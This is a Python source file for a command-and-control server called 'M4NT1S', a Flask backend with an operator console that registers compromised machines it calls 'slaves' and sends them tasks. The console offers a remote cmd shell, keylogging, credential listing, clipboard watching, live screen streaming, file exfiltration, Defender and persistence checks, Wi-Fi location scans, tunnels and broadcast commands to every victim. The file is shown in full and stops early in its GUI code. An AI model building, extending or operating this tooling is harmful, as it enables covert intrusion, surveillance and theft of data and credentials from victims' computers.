#!/usr/bin/env python3
"""
M4NT1S C2 Server — Layer 0 (Console) / Layer 1 (Shell) / Layer 2 (Collect) / Layer 3 (Recon)
- Stream: frames POST to /api/v1/stream, GUI shows latest at wire rate
- KILLSWITCH: agent self-terminates after posting its final result

DATA LOCATION:
  DB_FILE  = <script dir>/C2/c2.db
  ID_FILE  = <script dir>/C2/slave_ids.json
  uploads  = <script dir>/C2/uploads/
  The C2/ folder is created automatically. Paths are anchored to the script's
  own directory (via __file__) so it does not matter which folder you launch
  from. This prevents the "two c2.db files, one empty" bug where a relative
  path resolved to the wrong working directory.
"""

import sqlite3
import json
import datetime
import time
import os
import sys
import threading
import requests
import tkinter as tk
from tkinter import ttk, simpledialog
import queue
import logging
import warnings
import base64
import hmac
import webbrowser
from io import BytesIO
from urllib.parse import quote
from PIL import Image, ImageTk

warnings.filterwarnings("ignore")

from logging.handlers import QueueHandler
from flask import Flask, request, jsonify

# ---------------------------------------------------------------------------
# PATHS - anchored to this script's directory, not the current working dir.
# ---------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'C2')
os.makedirs(DATA_DIR, exist_ok=True)

app = Flask(__name__)
DB_FILE = os.path.join(DATA_DIR, 'c2.db')
ID_FILE = os.path.join(DATA_DIR, 'slave_ids.json')
SERVER_URL = 'http://127.0.0.1:5000'

log_queue = queue.Queue()
image_queue = queue.Queue()
session_log_queue = queue.Queue()
console_input_queue = queue.Queue()
image_cache = {}
IMAGE_CACHE_MAX = 50   # screenshots kept for /api/v1/image/<task_id>

ids_lock = threading.Lock()

# ---------------------------------------------------------------------------
# SCHEMA
# ---------------------------------------------------------------------------
def ensure_fingerprint_column():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("PRAGMA table_info(slaves)")
    columns = [col[1] for col in c.fetchall()]
    if 'fingerprint' not in columns:
        c.execute("ALTER TABLE slaves ADD COLUMN fingerprint TEXT")
        c.execute("""
            CREATE TABLE slaves_new (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                numeric_id INTEGER UNIQUE NOT NULL,
                fingerprint TEXT UNIQUE,
                hostname TEXT,
                public_ip TEXT,
                os TEXT,
                kernel TEXT,
                last_seen TIMESTAMP,
                status TEXT DEFAULT 'active'
            )
        """)
        c.execute("""
            INSERT INTO slaves_new (id, numeric_id, fingerprint, hostname, public_ip, os, kernel, last_seen, status)
            SELECT id, numeric_id, NULL, hostname, public_ip, os, kernel, last_seen, status FROM slaves
        """)
        c.execute("DROP TABLE slaves")
        c.execute("ALTER TABLE slaves_new RENAME TO slaves")
        conn.commit()
    conn.close()

def ensure_new_columns():
    conn = db_conn()
    c = conn.cursor()
    c.execute("PRAGMA table_info(slaves)")
    cols = [col[1] for col in c.fetchall()]
    additions = [
        ("domain",      "TEXT"),
        ("is_admin",    "INTEGER DEFAULT 0"),
        ("tunnel_kind", "TEXT"),
        ("tunnel_port", "INTEGER"),
        ("last_cmd",    "TEXT"),
        ("notes",       "TEXT"),
    ]
    for name, typ in additions:
        if name not in cols:
            c.execute(f"ALTER TABLE slaves ADD COLUMN {name} {typ}")

    c.execute("""CREATE TABLE IF NOT EXISTS tunnels (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        numeric_id INTEGER NOT NULL,
        kind TEXT NOT NULL,
        remote_port INTEGER,
        local_port INTEGER,
        started_at TIMESTAMP,
        stopped_at TIMESTAMP,
        active INTEGER DEFAULT 1
    )""")
    conn.commit()
    conn.close()

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS slaves (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        numeric_id INTEGER UNIQUE NOT NULL,
        fingerprint TEXT UNIQUE,
        hostname TEXT,
        public_ip TEXT,
        os TEXT,
        kernel TEXT,
        last_seen TIMESTAMP,
        status TEXT DEFAULT 'active'
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        numeric_id INTEGER NOT NULL,
        command TEXT NOT NULL,
        payload TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        assigned_at TIMESTAMP,
        completed_at TIMESTAMP,
        result TEXT
    )""")
    conn.commit()
    conn.close()
    ensure_fingerprint_column()
    ensure_new_columns()

def db_conn():
    return sqlite3.connect(DB_FILE)

# ---------------------------------------------------------------------------
# IDS FILE
# ---------------------------------------------------------------------------
def load_ids():
    if not os.path.exists(ID_FILE):
        return {}
    try:
        with open(ID_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_ids(ids):
    with open(ID_FILE, 'w') as f:
        json.dump(ids, f, indent=4, default=str)

def migrate_ids_file():
    if not os.path.exists(ID_FILE):
        return
    try:
        with open(ID_FILE, 'r') as f:
            data = json.load(f)
    except Exception:
        return
    if not data:
        return
    first_val = next(iter(data.values()))
    if isinstance(first_val, dict):
        return
    print(f"  Migrating {ID_FILE} to v2 format...")
    migrated = {}
    conn = db_conn()
    c = conn.cursor()
    for hostname, numeric_id in data.items():
        c.execute("""SELECT is_admin, domain, os, kernel, last_seen, notes,
            tunnel_kind, tunnel_port FROM slaves WHERE numeric_id = ?""", (numeric_id,))
        row = c.fetchone()
        rec = {"id": numeric_id, "admin": "no", "domain": "WORKGROUP",
               "os": "", "kernel": "", "last_seen": "", "notes": "",
               "tunnel_kind": None, "tunnel_port": None}
        if row:
            rec["admin"] = "yes" if row[0] else "no"
            rec["domain"] = row[1] or "WORKGROUP"
            rec["os"] = row[2] or ""
            rec["kernel"] = row[3] or ""
            rec["last_seen"] = str(row[4]) if row[4] else ""
            rec["notes"] = row[5] or ""
            rec["tunnel_kind"] = row[6]
            rec["tunnel_port"] = row[7]
        migrated[hostname] = rec
    conn.close()
    save_ids(migrated)
    print(f"  Migrated {len(migrated)} entries")

def snapshot_slave_to_ids(numeric_id):
    conn = db_conn()
    c = conn.cursor()
    c.execute("""SELECT hostname, is_admin, domain, os, kernel, last_seen, notes,
        tunnel_kind, tunnel_port FROM slaves WHERE numeric_id = ?""", (numeric_id,))
    row = c.fetchone()
    conn.close()
    if not row or not row[0]:
        return
    with ids_lock:
        ids = load_ids()
        ids[row[0]] = {
            "id": numeric_id,
            "admin": "yes" if row[1] else "no",
            "domain": row[2] or "WORKGROUP",
            "os": row[3] or "",
            "kernel": row[4] or "",
            "last_seen": str(row[5]) if row[5] else "",
            "notes": row[6] or "",
            "tunnel_kind": row[7],
            "tunnel_port": row[8],
        }
        save_ids(ids)

def get_next_id():
    conn = db_conn()
    c = conn.cursor()
    c.execute("SELECT MAX(numeric_id) FROM slaves")
    max_id = c.fetchone()[0]
    conn.close()
    return (max_id or 0) + 1

# ---------------------------------------------------------------------------
# COMMAND HELPERS
# ---------------------------------------------------------------------------
def queue_command(numeric_id, command, payload=None):
    conn = db_conn()
    c = conn.cursor()
    c.execute("SELECT 1 FROM slaves WHERE numeric_id = ?", (numeric_id,))
    if not c.fetchone():
        conn.close()
        return None
    c.execute("INSERT INTO commands (numeric_id, command, payload) VALUES (?, ?, ?)",
              (numeric_id, command, json.dumps(payload) if payload else None))
    task_id = c.lastrowid
    c.execute("UPDATE slaves SET last_cmd = ? WHERE numeric_id = ?", (command, numeric_id))
    conn.commit()
    conn.close()
    return task_id

def wait_result(task_id, timeout=10.0):
    """Poll the DB until the command completes. Returns None on timeout,
    on a missing row, or immediately when task_id is falsy (queue_command
    returns None for an unknown slave — old code then spun for the whole
    timeout doing `WHERE id = NULL`)."""
    if not task_id:
        return None
    conn = db_conn()
    c = conn.cursor()
    start = time.time()
    while time.time() - start < timeout:
        c.execute("SELECT status, result FROM commands WHERE id = ?", (task_id,))
        row = c.fetchone()
        if row and row[0] == 'completed':
            conn.close()
            return row[1]
        time.sleep(0.2)
    conn.close()
    return None

def clear_pending():
    conn = db_conn()
    c = conn.cursor()
    c.execute("DELETE FROM commands WHERE status = 'pending'")
    n = c.rowcount
    conn.commit()
    conn.close()
    return n

def parse_wifi_scan(netsh_output):
    if not netsh_output:
        return "No output from agent."
    networks = []
    current = {}
    for raw in netsh_output.splitlines():
        line = raw.strip()
        if line.startswith("SSID ") and " : " in line:
            if current:
                networks.append(current)
            current = {"ssid": line.split(" : ", 1)[1]}
        elif line.startswith("BSSID ") and " : " in line:
            current["bssid"] = line.split(" : ", 1)[1]
        elif line.startswith("Signal") and " : " in line:
            current["signal"] = line.split(" : ", 1)[1]
        elif line.startswith("Channel") and " : " in line:
            current["channel"] = line.split(" : ", 1)[1]
    if current:
        networks.append(current)
    if not networks:
        return "No networks parsed."
    out = [f"{len(networks)} network(s) visible:"]
    for n in networks:
        out.append(f"  {n.get('ssid','?')}  sig={n.get('signal','?')}  ch={n.get('channel','?')}  bssid={n.get('bssid','?')}")
    return "\n".join(out)

# ---------------------------------------------------------------------------
# FLASK
# ---------------------------------------------------------------------------
@app.before_request
def check_auth():
    """Every /api/v1 endpoint requires the token when C2_TOKEN is set.

    The old version exempted /api/v1/image/ and /api/v1/stream, which meant
    anyone who could reach the (tunnelled, public) port could pull every
    screenshot or inject frames. The token is accepted from the
    X-C2-Token header, a ?token= query parameter (so a browser tab can
    open an image URL) or a c2_token cookie.
    """
    token = os.environ.get('C2_TOKEN')
    if not token:
        return
    if not request.path.startswith('/api/v1/'):
        return
    provided = (request.headers.get('X-C2-Token')
                or request.args.get('token')
                or request.cookies.get('c2_token')
                or '')
    if not hmac.compare_digest(str(provided), token):
        return jsonify({"error": "unauthorized"}), 401

@app.route('/api/v1/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid JSON"}), 400

    hostname = data.get('hostname', 'unknown')
    public_ip = request.headers.get('CF-Connecting-IP')
    if not public_ip:
        public_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in public_ip:
            public_ip = public_ip.split(',')[0].strip()
    os_ver = data.get('os', 'unknown')
    kernel = data.get('kernel', 'unknown')
    fingerprint = data.get('fingerprint')
    admin_val = data.get('admin', False)
    domain_val = data.get('domain', 'WORKGROUP')

    if fingerprint is not None:
        fingerprint = str(fingerprint)

    conn = db_conn()
    c = conn.cursor()
    now = datetime.datetime.now(datetime.timezone.utc)

    if fingerprint is not None:
        c.execute("SELECT numeric_id FROM slaves WHERE fingerprint = ?", (fingerprint,))
        row = c.fetchone()
        if row:
            numeric_id = row[0]
            c.execute("""UPDATE slaves
                SET hostname = ?, public_ip = ?, os = ?, kernel = ?, last_seen = ?,
                    status = 'active', is_admin = ?, domain = ?
                WHERE numeric_id = ?""",
                (hostname, public_ip, os_ver, kernel, now,
                 1 if admin_val else 0, domain_val, numeric_id))
            conn.commit(); conn.close()
            snapshot_slave_to_ids(numeric_id)
            log_queue.put(f"[RE-REG] slave ID {numeric_id:04d} ({hostname}) from {public_ip}")
            return jsonify({"numeric_id": numeric_id, "status": "ok"})

    c.execute("SELECT numeric_id FROM slaves WHERE hostname = ?", (hostname,))
    row = c.fetchone()
    if row:
        numeric_id = row[0]
        if fingerprint is not None:
            c.execute("UPDATE slaves SET fingerprint = ? WHERE numeric_id = ?", (fingerprint, numeric_id))
        c.execute("""UPDATE slaves
            SET public_ip = ?, os = ?, kernel = ?, last_seen = ?, status = 'active',
                is_admin = ?, domain = ?
            WHERE numeric_id = ?""",
            (public_ip, os_ver, kernel, now, 1 if admin_val else 0, domain_val, numeric_id))
        conn.commit(); conn.close()
        snapshot_slave_to_ids(numeric_id)
        log_queue.put(f"[RE-REG] hostname '{hostname}' as ID {numeric_id:04d}")
        return jsonify({"numeric_id": numeric_id, "status": "ok"})

    new_id = get_next_id()
    c.execute("""INSERT INTO slaves
        (numeric_id, fingerprint, hostname, public_ip, os, kernel, last_seen, is_admin, domain)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (new_id, fingerprint, hostname, public_ip, os_ver, kernel, now,
         1 if admin_val else 0, domain_val))
    conn.commit(); conn.close()
    snapshot_slave_to_ids(new_id)
    log_queue.put(f"[NEW] slave ID {new_id:04d} ({hostname}) from {public_ip} admin={'yes' if admin_val else 'no'}")
    return jsonify({"numeric_id": new_id, "status": "ok"})

@app.route('/api/v1/poll', methods=['POST'])
def poll():
    data = request.get_json()
    if not data or 'id' not in data:
        return jsonify({"error": "Missing id"}), 400

    numeric_id = data['id']
    admin_val = data.get('admin')
    domain_val = data.get('domain')

    conn = db_conn()
    c = conn.cursor()
    now = datetime.datetime.now(datetime.timezone.utc)
    c.execute("UPDATE slaves SET last_seen = ?, status = 'active' WHERE numeric_id = ?",
              (now, numeric_id))
    if admin_val is not None:
        c.execute("UPDATE slaves SET is_admin = ? WHERE numeric_id = ?",
                  (1 if admin_val else 0, numeric_id))
    if domain_val:
        c.execute("UPDATE slaves SET domain = ? WHERE numeric_id = ?", (domain_val, numeric_id))
    conn.commit()

    try:
        snapshot_slave_to_ids(numeric_id)
    except Exception as e:
        log_queue.put(f"[!] slave_ids.json update failed: {e}")

    c.execute("""SELECT id, command, payload FROM commands
        WHERE numeric_id = ? AND status = 'pending'
        ORDER BY created_at LIMIT 1""", (numeric_id,))
    row = c.fetchone()
    if row:
        cmd_id, command, payload = row
        c.execute("UPDATE commands SET status = 'in_progress', assigned_at = ? WHERE id = ?",
                  (now, cmd_id))
        conn.commit(); conn.close()
        try:
            payload_obj = json.loads(payload) if payload else None
        except Exception:
            payload_obj = None
        return jsonify({"command": command, "task_id": cmd_id, "payload": payload_obj})
    conn.close()
    return jsonify({"command": "NOP"})

@app.route('/api/v1/result', methods=['POST'])
def result():
    data = request.get_json()
    if not data or 'task_id' not in data:
        return jsonify({"error": "Missing task_id"}), 400

    task_id = data['task_id']
    status = data.get('status', 'completed')
    output = data.get('output', '')

    conn = db_conn()
    c = conn.cursor()
    c.execute("SELECT numeric_id, command FROM commands WHERE id = ?", (task_id,))
    meta = c.fetchone()
    c.execute("UPDATE commands SET status = ?, completed_at = ?, result = ? WHERE id = ?",
              (status, datetime.datetime.now(datetime.timezone.utc), output, task_id))
    conn.commit(); conn.close()

    if not meta:
        return jsonify({"status": "ok"})
    numeric_id, command = meta
    output = output or ""

    if output.startswith("IMAGE:"):
        try:
            img_data = base64.b64decode(output[6:])
            image_cache[task_id] = img_data
            # Bounded cache: otherwise every screenshot of the session is
            # held in RAM for the life of the process.
            if len(image_cache) > IMAGE_CACHE_MAX:
                for old in list(image_cache)[:-IMAGE_CACHE_MAX]:
                    image_cache.pop(old, None)
            image_queue.put((numeric_id, img_data))
            # Open the tab off-thread so a slow browser launch cannot stall
            # this agent's /result response. The token rides in the query
            # string because a browser tab cannot send X-C2-Token.
            url = f"{SERVER_URL}/api/v1/image/{task_id}"
            tok = os.environ.get('C2_TOKEN')
            if tok:
                url += f"?token={quote(tok, safe='')}"
            threading.Thread(target=webbrowser.open, args=(url,),
                             daemon=True).start()
        except Exception as e:
            log_queue.put(f"[!] image decode: {e}")
        return jsonify({"status": "ok"})

    if output.startswith("FILE:"):
        try:
            rest = output[5:]
            fname, b64 = rest.split(":", 1)
            fname = os.path.basename(fname) or f"task_{task_id}.bin"
            data_bytes = base64.b64decode(b64)
            uploads_dir = os.path.join(DATA_DIR, 'uploads')
            os.makedirs(uploads_dir, exist_ok=True)
            fpath = os.path.join(uploads_dir, f"task_{task_id}_{fname}")
            with open(fpath, 'wb') as f:
                f.write(data_bytes)
            session_log_queue.put(f"[FILE] {fpath} ({len(data_bytes)} bytes) from ID {numeric_id:04d}")
        except Exception as e:
            log_queue.put(f"[!] file decode: {e}")
        return jsonify({"status": "ok"})

    if command == 'STATUS':
        conn = db_conn(); c = conn.cursor()
        for line in output.splitlines():
            if line.startswith("Admin:"):
                val = 1 if "True" in line else 0
                c.execute("UPDATE slaves SET is_admin = ? WHERE numeric_id = ?", (val, numeric_id))
            elif line.startswith("User:"):
                user = line.split(":", 1)[1].strip()
                dom = user.split("\\", 1)[0] if "\\" in user else "WORKGROUP"
                c.execute("UPDATE slaves SET domain = ? WHERE numeric_id = ?", (dom, numeric_id))
        conn.commit(); conn.close()
        snapshot_slave_to_ids(numeric_id)

    if command == 'SYSINFO':
        conn = db_conn(); c = conn.cursor()
        for line in output.splitlines():
            if line.startswith("Domain:"):
                c.execute("UPDATE slaves SET domain = ? WHERE numeric_id = ?",
                          (line.split(":", 1)[1].strip(), numeric_id))
        conn.commit(); conn.close()
        snapshot_slave_to_ids(numeric_id)

    if command == 'TUNNEL_START':
        kind = "?"
        port = None
        for token in output.split():
            if token.startswith("Tunnel"):
                continue
            if token in ("rdp", "socks", "shell"):
                kind = token
            elif token.startswith("remote_port="):
                try:
                    port = int(token.split("=", 1)[1])
                except Exception:
                    pass
        if kind != "?":
            conn = db_conn(); c = conn.cursor()
            c.execute("""INSERT INTO tunnels (numeric_id, kind, remote_port, started_at, active)
                VALUES (?, ?, ?, ?, 1)""",
                (numeric_id, kind, port, datetime.datetime.now(datetime.timezone.utc)))
            c.execute("UPDATE slaves SET tunnel_kind = ?, tunnel_port = ? WHERE numeric_id = ?",
                      (kind, port, numeric_id))
            conn.commit(); conn.close()
            snapshot_slave_to_ids(numeric_id)
            session_log_queue.put(f"[TUNNEL] up: ID {numeric_id:04d} {kind} :{port}")

    if command == 'TUNNEL_STOP':
        conn = db_conn(); c = conn.cursor()
        c.execute("""UPDATE tunnels SET active = 0, stopped_at = ?
            WHERE numeric_id = ? AND active = 1""",
            (datetime.datetime.now(datetime.timezone.utc), numeric_id))
        c.execute("UPDATE slaves SET tunnel_kind = NULL, tunnel_port = NULL WHERE numeric_id = ?", (numeric_id,))
        conn.commit(); conn.close()
        snapshot_slave_to_ids(numeric_id)
        session_log_queue.put(f"[TUNNEL] down: ID {numeric_id:04d}")

    if output and not output.startswith("ERROR:"):
        log_queue.put(f"[{command}] ID {numeric_id:04d}:\n{output}")
    elif output.startswith("ERROR:"):
        log_queue.put(f"[{command}] ID {numeric_id:04d} -> {output}")
    else:
        log_queue.put(f"[{command}] ID {numeric_id:04d} finished ({status})")
    return jsonify({"status": "ok"})

@app.route('/api/v1/stream', methods=['POST'])
def stream():
    data = request.get_json()
    if not data or 'frame' not in data or 'id' not in data:
        return jsonify({"error": "missing fields"}), 400
    try:
        img_data = base64.b64decode(data['frame'])
        image_queue.put((data['id'], img_data))
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/api/v1/image/<int:task_id>')
def serve_image(task_id):
    img_data = image_cache.get(task_id)
    if img_data:
        return img_data, 200, {'Content-Type': 'image/jpeg'}
    return "Image not found", 404

@app.route('/api/v1/upload', methods=['POST'])
def upload():
    task_id = request.form.get('task_id')
    if not task_id:
        return jsonify({"error": "Missing task_id"}), 400
    file = request.files.get('file')
    if not file:
        return jsonify({"error": "Missing file"}), 400
    uploads_dir = os.path.join(DATA_DIR, 'uploads')
    os.makedirs(uploads_dir, exist_ok=True)
    filepath = os.path.join(uploads_dir, f"task_{task_id}_{file.filename}")
    file.save(filepath)
    log_queue.put(f"[UPLOAD] {filepath}")
    return jsonify({"status": "ok"})

# ---------------------------------------------------------------------------
# LAYER 1 — SHELL
# ---------------------------------------------------------------------------
def layer_1_shell(numeric_id):
    print(f"\n  LAYER 1 [SHELL] - ID {numeric_id:04d}. Type 'exit' to return.\n")
    print("  Every line runs on the slave as `cmd /c <line>`.\n")

    while True:
        try:
            sys.stdout.write(f"  [{numeric_id:04d}]> ")
            sys.stdout.flush()
        except Exception:
            pass

        line = console_input_queue.get()
        if line is None:
            print("\n  Console input closed. Returning to Layer 0.\n")
            return
        line = line.rstrip('\n').rstrip('\r')
        if not line.strip():
            continue
        if line.strip().lower() == "exit":
            print("\n  Returning to Layer 0.\n")
            return

        tid = queue_command(numeric_id, "SHELL", {"cmd": line})
        if not tid:
            print(f"  Slave ID {numeric_id:04d} not found.\n")
            return
        out = wait_result(tid, timeout=20)
        if out:
            print(out.rstrip())
        else:
            print("  [no response]")

# ---------------------------------------------------------------------------
# LAYER 2 — COLLECT
# ---------------------------------------------------------------------------
def layer_2_collect(numeric_id):
    print(f"\n  LAYER 2 [COLLECT] - ID {numeric_id:04d}. Type 'exit' to return.\n")
    print("  Commands:")
    print("    stream start [interval_ms] | stream stop")
    print("    keylog start | keylog stop | keylog pull")
    print("    file pull <path> | file push <path> <b64>")
    print("    creds | history")
    print("    clip watch [interval_ms] | clip stop\n")

    while True:
        try:
            sys.stdout.write("  [col]> ")
            sys.stdout.flush()
        except Exception:
            pass

        line = console_input_queue.get()
        if line is None:
            break
        line = line.strip()
        if not line:
            continue
        if line.lower() == "exit":
            print("\n  Returning to Layer 0.\n")
            return

        parts = line.split()
        cmd = parts[0].lower()

        if cmd == "stream" and len(parts) >= 2:
            sub = parts[1].lower()
            if sub == "start":
                interval = 500
                if len(parts) > 2:
                    try:
                        interval = int(parts[2])
                    except ValueError:
                        pass
                tid = queue_command(numeric_id, "SCREEN_STREAM_START", {"interval_ms": interval})
                if not tid:
                    print(f"  Slave ID {numeric_id:04d} not found.")
                    continue
                out = wait_result(tid, timeout=5)
                print(f"  {out or '[no response]'}")
            elif sub == "stop":
                tid = queue_command(numeric_id, "SCREEN_STREAM_STOP")
                out = wait_result(tid, timeout=5)
                print(f"  {out or '[no response]'}")
            else:
                print("  stream start|stop")
            continue

        if cmd == "keylog":
            if len(parts) < 2:
                print("  keylog start|stop|pull"); continue
            sub = parts[1].lower()
            if sub == "start":
                queue_command(numeric_id, "KEYLOG_START"); print("  Keylog start requested.")
            elif sub == "stop":
                queue_command(numeric_id, "KEYLOG_STOP"); print("  Keylog stop requested.")
            elif sub == "pull":
                tid = queue_command(numeric_id, "KEYLOG_PULL")
                out = wait_result(tid, 8)
                print(f"  {out or '[no buffer]'}")
            else:
                print("  keylog start|stop|pull")
            continue

        if cmd == "file" and len(parts) >= 2:
            sub = parts[1].lower()
            if sub == "pull" and len(parts) >= 3:
                path = " ".join(parts[2:])
                tid = queue_command(numeric_id, "FILE_PULL", {"path": path})
                print(f"  Pulling {path}...")
                out = wait_result(tid, 20)
                if out and out.startswith("FILE:"):
                    print("  File received; see Session Logs / uploads/")
                else:
                    print(f"  {out or '[no response]'}")
            elif sub == "push" and len(parts) >= 4:
                path = parts[2]
                b64 = parts[3]
                tid = queue_command(numeric_id, "FILE_PUSH", {"path": path, "data_b64": b64})
                print(f"  {wait_result(tid, 10) or '[no response]'}")
            else:
                print("  file pull <path> | file push <path> <b64>")
            continue

        if cmd == "creds":
            tid = queue_command(numeric_id, "CRED_LIST")
            out = wait_result(tid, 15)
            print(f"  {out or '[no response]'}")
            continue

        if cmd == "history":
            tid = queue_command(numeric_id, "HISTORY_READ")
            out = wait_result(tid, 8)
            print(f"  {out or '[no response]'}")
            continue

        if cmd == "clip":
            if len(parts) < 2:
                print("  clip watch [interval_ms] | clip stop"); continue
            sub = parts[1].lower()
            if sub == "watch":
                interval = 2000
                if len(parts) > 2:
                    try:
                        interval = int(parts[2])
                    except ValueError:
                        pass
                queue_command(numeric_id, "CLIPBOARD_WATCH_START", {"interval_ms": interval})
                print(f"  Clipboard watch started ({interval} ms).")
            elif sub == "stop":
                queue_command(numeric_id, "CLIPBOARD_WATCH_STOP")
                print("  Clipboard watch stopped.")
            else:
                print("  clip watch|stop")
            continue

        print(f"  Unknown: {line}")

# ---------------------------------------------------------------------------
# LAYER 3 — RECON
# ---------------------------------------------------------------------------
def layer_3_recon(numeric_id):
    print(f"\n  LAYER 3 [RECON] - ID {numeric_id:04d}. Type 'exit' to return.\n")
    print("  Commands:")
    print("    processes | network | dns | defender | tasks | cleanup")
    print("    triangulate     - Wi-Fi scan (netsh parse)\n")

    one_shots = {
        "processes":   ("PROCESSES", 12),
        "network":     ("NETWORK_INFO", 10),
        "dns":         ("DNS_CACHE", 8),
        "defender":    ("DEFENDER_CHECK", 10),
        "tasks":       ("PERSIST_LIST", 12),
        "cleanup":     ("TASK_CLEANUP", 10),
        "triangulate": ("TRIANGULATE", 15),
    }

    while True:
        try:
            sys.stdout.write("  [rec]> ")
            sys.stdout.flush()
        except Exception:
            pass

        line = console_input_queue.get()
        if line is None:
            break
        line = line.strip()
        if not line:
            continue
        if line.lower() == "exit":
            print("\n  Returning to Layer 0.\n")
            return

        cmd = line.split()[0].lower()
        if cmd in one_shots:
            agent_cmd, timeout = one_shots[cmd]
            tid = queue_command(numeric_id, agent_cmd)
            if not tid:
                print(f"  Slave ID {numeric_id:04d} not found.")
                continue
            out = wait_result(tid, timeout)
            if cmd == "triangulate" and out:
                print(f"\n{parse_wifi_scan(out)}\n")
            else:
                print(f"\n{out if out else '[no response]'}\n")
            continue

        print(f"  Unknown: {line}")

# ---------------------------------------------------------------------------
# LAYER 0 — CONSOLE
# ---------------------------------------------------------------------------
def layer_0():
    print("\n  ======================================================")
    print("      M4NT1S C2 - LAYER 0 [CONSOLE]")
    print("  ======================================================\n")
    print("  Listening on http://0.0.0.0:5000")
    print("  Auth: " + ("X-C2-Token required" if os.environ.get('C2_TOKEN') else "disabled"))
    print("")
    print("  One-shots:")
    print("     <id> shell <cmd>       run cmd /c <cmd>")
    print("     <id> status            user / admin / host / uptime")
    print("     <id> sysinfo           domain / groups / adapters")
    print("     <id> screenshot        one-shot capture (opens in browser)")
    print("     <id> clipboard         current clipboard contents")
    print("     <id> locate            Wi-Fi scan")
    print("")
    print("  Layers (each accepts 'exit' to return):")
    print("     <id> enter shell       live shell")
    print("     <id> enter collect     stream, keylog, files, creds")
    print("     <id> enter recon       processes, network, defender, tasks")
    print("")
    print("  Cross-cutting:")
    print("     broadcast <cmd>        run same command on all active slaves")
    print("     KILLSWITCH             self-destruct all active slaves")
    print("     EXIT                   shutdown\n")

    while True:
        try:
            sys.stdout.write("> ")
            sys.stdout.flush()
        except Exception:
            pass

        line = console_input_queue.get()
        if line is None:
            break
        line = line.strip()
        if not line:
            continue
        if line.upper() == "EXIT" or line.lower() == "exit":
            print("\n  Shutting down C2 server.\n")
            os._exit(0)

        if line.upper() == "KILLSWITCH":
            cancelled = clear_pending()
            if cancelled:
                session_log_queue.put(f"[!] Cancelled {cancelled} pending command(s) before killswitch.")
            conn = db_conn(); c = conn.cursor()
            c.execute("SELECT numeric_id FROM slaves WHERE status = 'active'")
            rows = c.fetchall()
            if not rows:
                print("  No active slaves."); conn.close(); continue
            for (sid,) in rows:
                c.execute("INSERT INTO commands (numeric_id, command) VALUES (?, 'KILLSWITCH')", (sid,))
            conn.commit(); conn.close()
            print(f"  KILLSWITCH sent to {len(rows)} active slaves.")
            continue

        parts = line.split()
        if parts[0] == "broadcast":
            if len(parts) < 3:
                print("  Usage: broadcast <command> [args...]")
                continue
            cmd = parts[1].upper()
            payload = None
            if len(parts) > 2:
                payload = {"cmd": " ".join(parts[2:])} if cmd == "SHELL" else " ".join(parts[2:])
            conn = db_conn(); c = conn.cursor()
            c.execute("SELECT numeric_id FROM slaves WHERE status = 'active'")
            rows = c.fetchall(); conn.close()
            if not rows:
                print("  No active slaves."); continue
            for (sid,) in rows:
                queue_command(sid, cmd, payload)
            print(f"  Broadcast '{cmd}' queued for {len(rows)} active slaves.")
            continue

        if len(parts) < 2:
            print("  Usage: <id> <command> ...")
            continue

        raw_id = parts[0]
        if not raw_id.isdigit():
            print("  ID must be numeric (e.g. 0001)")
            continue
        numeric_id = int(raw_id)
        command = parts[1].lower()

        conn = db_conn(); c = conn.cursor()
        c.execute("SELECT 1 FROM slaves WHERE numeric_id = ?", (numeric_id,))
        if not c.fetchone():
            print(f"  Slave ID {numeric_id:04d} not found.")
            conn.close(); continue
        conn.close()

        if command == "enter" and len(parts) >= 3:
            sub = parts[2].lower()
            if sub == "shell":
                layer_1_shell(numeric_id)
            elif sub == "collect":
                layer_2_collect(numeric_id)
            elif sub == "recon":
                layer_3_recon(numeric_id)
            else:
                print(f"  Unknown layer: {sub}  (shell | collect | recon)")
            continue

        if command == "locate":
            tid = queue_command(numeric_id, "TRIANGULATE")
            print(f"  Scanning Wi-Fi on ID {numeric_id:04d}...")
            out = wait_result(tid, 20)
            if out:
                print(f"\n{parse_wifi_scan(out)}\n")
            else:
                print("  Timeout waiting for scan.")
            continue

        if command == "screenshot":
            tid = queue_command(numeric_id, "SCREEN_CAPTURE")
            out = wait_result(tid, 8)
            if out and out.startswith("ERROR:"):
                print(f"  {out}")
            elif out and out.startswith("IMAGE:"):
                print(f"  Screenshot captured (browser tab opening).")
            elif out:
                print(f"  {out[:200]}")
            else:
                print("  [no response]")
            continue

        if command == "status":
            tid = queue_command(numeric_id, "STATUS")
            out = wait_result(tid, 6)
            print(f"\n{out if out else '[no response]'}\n")
            continue

        if command == "sysinfo":
            tid = queue_command(numeric_id, "SYSINFO")
            out = wait_result(tid, 8)
            print(f"\n{out if out else '[no response]'}\n")
            continue

        if command == "clipboard":
            tid = queue_command(numeric_id, "CLIPBOARD_GET")
            out = wait_result(tid, 5)
            print(f"\n{out if out else '[no response]'}\n")
            continue

        if command == "shell":
            if len(parts) < 3:
                print("  Usage: <id> shell <command>")
                continue
            cmd_str = " ".join(parts[2:])
            tid = queue_command(numeric_id, "SHELL", {"cmd": cmd_str})
            out = wait_result(tid, 10)
            print(f"\n{out if out else '[no response]'}\n")
            continue

        print(f"  Unknown command: {command}")

# ---------------------------------------------------------------------------
# GUI
# ---------------------------------------------------------------------------
def run_gui():
    root = tk.Tk()
    root.title("M4NT1S C2 - Slave Monitor")
    root.geometry("960x720")
    root.configure(bg="#1e1e1e")

    BG = "#1e1e1e"; FRAME_BG = "#252526"
    TEXT_COLOR = "#ffffff"; DIM_TEXT = "#aaaaaa"
